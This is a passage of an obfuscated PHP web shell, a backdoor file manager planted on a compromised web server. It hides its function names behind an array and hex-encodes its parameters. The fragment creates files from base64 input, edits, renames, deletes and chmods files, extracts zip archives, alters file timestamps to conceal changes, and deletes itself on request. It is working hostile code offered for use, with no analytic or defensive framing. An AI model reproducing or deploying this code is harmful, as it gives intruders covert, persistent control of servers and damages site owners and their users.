                    '.$c_;rayeli($checkfx,rehex($_GET["t"]));if(!empty($_POST["t"])){$p=$MRT[33]($_POST["t"]);if($p){if(!$MRT[25](rehex($_GET["t"]),$p,$p)){ER();}else{echo '<body onload="history.go(-1);">';}}else{ER();}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["k"])){$checkfx=$d.'/'.rehex($_GET["k"]);if($MRT[26]($checkfx)){echo $a_.'<div style="float:left"><h2>CHMOD '.rehex($_GET["k"]).'</h2></div><div style="float:right">Path: <code>'.$checkfx.'</code> '.fullx($checkfx).'</div>'.$b_.header_Everyfile($_GET["k"]).'<center><form action="" method="post"><input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="'.$MRT[22]($MRT[23]('%o',$MRT[24](rehex($_GET["k"]))),-4).'"> '.$d_.'
                        '.$c_;rayeli($checkfx,rehex($_GET["k"]));if(!empty($_POST["b"])){$x=$_POST["b"];$t=0;for($i=strlen($x)-1;$i>=0;--$i)$t+=(int)$x[$i]*pow(8,(strlen($x)-$i-1));if(!$MRT[12](rehex($_GET["k"]),$t)){ER();}else{echo '<body onload="history.go(-1);">';}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["l"])){echo $a_.'+DIR'.$b_.' <form action="" method="post"><input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">'.$d_.'
        '.$c_;if(isset($_POST["l"])){if(!$MRT[11]($_POST["l"])){ER();}else{echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'2f'.hex($_POST["l"]).'">';}}}elseif(isset($_GET["q"])){if(@$MRT[10](__FILE__)){@$MRT[38]($MRT[9]);header("Location: ".basename($_SERVER['PHP_SELF'])."");exit();}else{echo $g;}}elseif(isset($_GET["n"])){echo $a_.'<h2 style="color: #fff;">+Creating a New File</h2>'.$b_.'
                            <script>function btoaMRD() { var input = document.getElementById("inputTextFQ").value; var encoded = btoa(input);document.getElementById("inputTextFQ").value = encoded; } </script><form action=""method="post"onsubmit="return btoaMRD()"><div class="form-row"><div class="col">File name</div><div class="col">Date</div><div class="col">Permission</div></div><div class="form-row"><div class="col"><input class="form-control"name="n"placeholder="Filename.txt"value="files.txt"autocomplete="off"id="copy-text"></div><div class="col"><input class="form-control"name="t"placeholder="Last Modified" value="'.$MRT[20]("Y-m-d H:i",$MRT[21]('../../')).'"></div><div class="col"><input class="form-control"name="b"placeholder="Permission"value="0644"></div></div><textarea class="form-control"id="inputTextFQ"name="e"></textarea><br><script>var editor=CodeMirror.fromTextArea(document.getElementById("inputTextFQ"),{theme:"monokai",mode:"application/x-httpd-php",styleActiveLine:!0,matchBrackets:!0,lineNumbers:!0,indentUnit:4,indentWithTabs:!0,lineWrapping:!0,autofocus:!0}).setSize(1136,400)</script>
                    '.$d_.'
            '.$c_;if(isset($_POST["n"])){if(!$MRT[25]($_POST["n"])){ER();}else{if(isset($_POST["e"])){$ex=b64ed($_POST['e']);$fp=$MRT[17]($_POST["n"],'w');if($MRT[18]($fp,b64dd($ex))){$MRT[19]($fp);$wfolder=$MRT[20]("Y-m-d g:i",$MRT[21]("/"));$px=$MRT[33]($wfolder);@$MRT[25]($checkfx,$px);}}if(!empty($_POST["t"])){$p=$MRT[33]($_POST["t"]);if($p){if(!$MRT[25]($_POST["n"],$p,$p)){ER();}}}if(!empty($_POST["b"])){$x=$_POST["b"];$t=0;for($i=strlen($x)-1;$i>=0;--$i)$t+=(int)$x[$i]*pow(8,(strlen($x)-$i-1));if(!$MRT[12]($_POST["n"],$t)){ER();}}echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'&e='.hex($_POST["n"]).'">';}}}elseif(isset($_GET["r"])){$checkfx=$d.'/'.rehex($_GET["r"]);if($MRT[26]($checkfx)){echo $a_.'<div style="float:left;"><h2>Rename '.rehex($_GET["r"]).'</h2></div><div style="float:right">Path: <code>'.$d.'/'.rehex($_GET["r"]).'</code> '.fullx($checkfx).'</div>'.$b_.header_Everyfile($_GET["r"]).'
 <center><form action="" method="post"><input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="'.rehex($_GET["r"]).'"> '.$d_.'
        '.$c_;rayeli($checkfx,rehex($_GET["r"]));if(isset($_POST["r"])){if($MRT[26]($_POST["r"])){ER();}else{if($MRT[27](rehex($_GET["r"]),$_POST["r"])){OK();}else{ER();}}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET[hex('md5xon')])){startmd5();echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'&1">';}elseif(isset($_GET[hex('md5xoff')])){stopmd5();echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'&1">';}elseif(isset($_GET["z"])){$zip=new ZipArchive;$res=$zip->open(rehex($_GET["z"]));if($res===true){$zip->extractTo(rehex($_GET["d"]));$zip->close();OK();}else{ER();}}else{echo '<form method="post" action=""><table class="table table-dark table-hover table-striped table-sm table-borderless mt-3 hoverTable"><thead class="text-center"><tr><th><input type="checkbox" id="select_all" /></th><th> NAMES </th><th> ACTION ';echo '</th>';if(isset($_SESSION["satingga"])){echo '<th> SIZE ';echo '</th>';echo '<th> LAST MODIFIED</th><th>OWNER/GROUP </th><th>PERM </th>';}echo '</tr></thead><tbody>';$h="";$j="";$w=$MRT[13]($d);if($MRT[28]($w)||$MRT[29]($w)){foreach($w as $c){$e=$MRT[14]("\\","/",$d);if(!$MRT[30]($c,".zip")){$zi='';}else{$zi='[<a href="?d='.hex($e).'&z='.hex($c).'">U</a>]';}if($MRT[31]("$d/$c")){$o="";}elseif(!$MRT[32]("$d/$c")){$o=" h";}else{$o=" blink w\" style=\"";}$s=$MRT[34]("$d/$c")/1024;$s=round($s,3);if($s>=1024){$s=round($s/1024,2)." MB";}else{$s=$s." KB";}if(($c!=".")&&($c!="..")){$checkfxo=$e.'/'.$c;$exurl=$MRT[14]($_SERVER['DOCUMENT_ROOT'],'',$e).'/'.$c;if($MRT[30]($e,$_SERVER['DOCUMENT_ROOT'])!==false){if($e!=$_SERVER['DOCUMENT_ROOT']){$urlmx=' [<a href="//'.$_SERVER['HTTP_HOST'].$MRT[14]($_SERVER['DOCUMENT_ROOT'],'',$exurl).'" target="_blank">
&#x2346;</a>] ';}else{$urlmx=' [<a href="//'.$_SERVER['HTTP_HOST'].$exurl.'" target="_blank">&#x2346;</a>] ';}}else{$urlmx="";}$arraydomain=array('.com','.net','.id','.org','.com.','.net.','.org.','.edu.','.gov.','.gob.','.in');if(strposa($c,$arraydomain,1)){$codem7='[<a href="//'.$c.'" target="_blank">&#x2388;</a>]';}else{$codem7="";}if(isset($_SESSION["satingga"])){$checko=$o;$oknduk='<td> Directory</td><td><a class="ajx'.$o.'" href="?d='.hex($e).'&t='.hex($c).'">'.$MRT[20]("Y-m-d g:i",$MRT[21]("$d/$c")).'</a>  </td><td> <input style="border: none;border-bottom: 1px solid #00ff00;" type="text" size="13" type="text" onclick="this.select();" value="'.GetFileOwnerGroup($checkfxo).'"> </td><td>  <a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a> </td>';$okndek=' <td>'.$s.'</td><td><a class="ajx'.$o.'" href="?d='.hex($e).'&t='.hex($c).'">'.$MRT[20]("Y-m-d g:i",$MRT[21]("$d/$c")).'</a></td><td><input style="border: none;border-bottom: 1px solid #00ff00;" type="text" size="13" onclick="this.select();" value="'.GetFileOwnerGroup($checkfxo).'"></td><td><a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a></td>';}else{$oknduk="";$okndek="";$checko="";}($MRT[8]("$d/$c"))?$h.='<tr class="text-center"> <td width="7"><input type="checkbox" class="checkbox" name="cucok[]" value="'.$d.'/'.$c.'"/></td><td class="text-left"> &#128162; <a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a> </td><td> [<a class="ajx'.$checko.'" href="?d='.hex($e).'&r='.hex($c).'">REN</a>] [<a class="ajx'.$checko.'" href="?d='.hex($e).'&x='.hex($c).'">DEL</a>] '.$codem7.$urlmx.' </td>'.$oknduk.'</tr>':$j.='<tr class="text-center">
     <td width="7" class="text-center"><input type="checkbox" class="checkbox" name="cucok[]" value="'.$d.'/'.$c.'"/></td>
    <td class="text-left">              &#128304;
        <a title="'.$c.'" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>            </td>
    <td>[<a class="'.$checko.'" href="?d='.hex($e).'&e='.hex($c).'">EDIT</a>] [<a class="ajx'.$checko.'" href="?d='.hex($e).'&r='.hex($c).'">REN</a>] '.$zi.' [<a class="ajx'.$checko.'" href="?d='.hex($e).'&x='.hex($c).'">DEL</a>]
        '.$urlmx.' </td> '.$okndek.'</tr>';}}}echo $h;echo '<tr style="background-color:lime;" height="1px"><td colspan="9"></td></tr>';echo $j;echo '<tr height="2px"><td><button class="btn btn-danger btn-sm" type="submit" name="deleteFilez">DEL</button></td><td colspan="8" class="text-right small">';if(isset($_SESSION["satingga"])){echo '<a class="btn btn-secondary btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xoff').'">LITE</a>';}else{echo '<a class="btn btn-danger btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xon').'">FULL</a>';}echo '</td></tr></tbody></table></form>';}echo '<div class="card bg-dark mb-2 mt-4" style="margin-top:500px;"><table class="table table-borderless table-dark" ><tr><td colspan="2">';echo '<footer>';echo '<div class="text-center">Copyleft 2020-'.$MRT[20]("Y").' 1st<span style="color: #e25555;">&hearts;</span><a class="ajx" href="#">Kill Yourself with Kindness</a></div></footer></td></tr></table></div>';if(isset($_GET["1"])){echo $f;}elseif(isset($_GET["0"])){echo $g;}else{NULL;}echo '<script>var textWrapper=document.querySelector(".ml2");textWrapper.innerHTML=textWrapper.textContent.replace(/\S/g,"<span class=letter>$&</span>"),anime.timeline({loop:!0}).add({targets:".ml2 .letter",scale:[4,1],opacity:[0,1],translateZ:0,easing:"easeOutExpo",duration:950,delay:(e,t)=>70*t}).add({targets:".ml2",opacity:0,duration:1e3,easing:"easeOutExpo",delay:1e3}),$("#select_all").on("click",(function(){this.checked?$(".checkbox").each((function(){this.checked=!0})):$(".checkbox").each((function(){this.checked=!1}))})),$(".checkbox").on("click",(function(){$(".checkbox:checked").length==$(".checkbox").length?$("#select_all").prop("checked",!0):$("#select_all").prop("checked",!1)}));function btoaMRX() { var input = document.getElementById("inputTextY").value; var encoded = btoa(input);document.getElementById("inputTextY").value = encoded; } </script></div></body></html>'; ?>